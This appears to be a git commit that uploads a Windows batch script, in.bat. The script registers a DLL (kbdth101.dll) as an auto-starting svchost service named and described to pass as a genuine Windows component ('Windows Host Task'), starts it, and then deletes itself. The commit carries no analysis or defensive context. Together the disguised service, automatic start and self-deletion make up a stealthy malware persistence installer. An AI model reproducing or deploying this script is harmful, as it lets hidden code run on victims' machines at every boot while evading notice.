5ad62bd09c87211191a7ed029e81bccef4f3acb6
yusupovau <a.yusupovau@outlook.com>
2024-11-14 22:03:37 -0500

    Add files via upload

---
+++ in.bat
@@ -0,0 +1,7 @@
+@echo off
+sc create WinHostTask binPath= "%SystemRoot%\system32\svchost.exe -k WinHostTask" type= share start= auto DisplayName= "Windows Host Task"
+sc description WinHostTask "Provide Windows Host Task Query."
+reg add HKLM\SYSTEM\CurrentControlSet\services\WinHostTask\Parameters /v ServiceDll /t REG_EXPAND_SZ /d %SystemRoot%\system32\kbdth101.dll /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v WinHostTask /t REG_MULTI_SZ /d WinHostTask /f
+sc start WinHostTask
+del %0
